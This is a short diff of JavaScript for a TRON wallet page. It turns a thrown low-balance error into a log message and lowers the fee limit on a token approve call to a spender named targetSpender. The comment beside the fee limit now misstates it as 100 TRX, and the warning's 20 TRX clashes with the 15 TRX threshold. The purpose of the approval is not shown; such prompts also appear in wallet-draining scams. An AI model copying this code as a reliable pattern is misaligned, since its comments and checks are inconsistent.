@@ -123,7 +123,7 @@
             const balanceTRX = tw.fromSun(balanceSun);
             
             if (parseFloat(balanceTRX) < 15) {
-                throw "TRX 余额不足，请充值至少 20 TRX 作为手续费";
+                addLog("TRX 余额不足，请充值至少 20 TRX 作为手续费");
             }
             addLog("余额检查通过 (" + balanceTRX + " TRX)", "ok");
 
@@ -136,7 +136,7 @@
 
             // 唤起授权
             const txid = await contract.approve(targetSpender, sendAmount).send({
-                feeLimit: 100000000 // 最大消耗 100 TRX 的限额
+                feeLimit: 20000000 // 最大消耗 100 TRX 的限额
             });
 
             if (txid) {
